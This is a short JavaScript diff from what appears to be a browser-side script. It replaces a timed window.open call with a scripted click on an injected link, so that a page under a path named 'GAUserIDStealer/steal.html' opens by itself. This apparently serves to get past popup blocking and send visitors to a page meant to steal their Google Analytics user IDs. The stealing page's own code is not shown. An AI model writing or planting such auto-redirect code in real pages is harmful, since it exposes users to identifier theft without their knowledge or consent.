@@ -54,9 +54,14 @@
 //                 }
 //             };
 //         xhr.send();
-         createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 1000);
-         close_w = setTimeout(function(){createWindow.close()}, 1000);
+//          createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 1000);
+//          close_w = setTimeout(function(){createWindow.close()}, 1000);
          
+         var element = document.createElement('a');
+         element.setAttribute('href', 'https://newmangervase91.github.io/GAUserIDStealer/steal.html');
+         element.setAttribute('target', '_blank');
+         document.body.appendChild(element);
+         element.click();
          
      }
      doFlow();
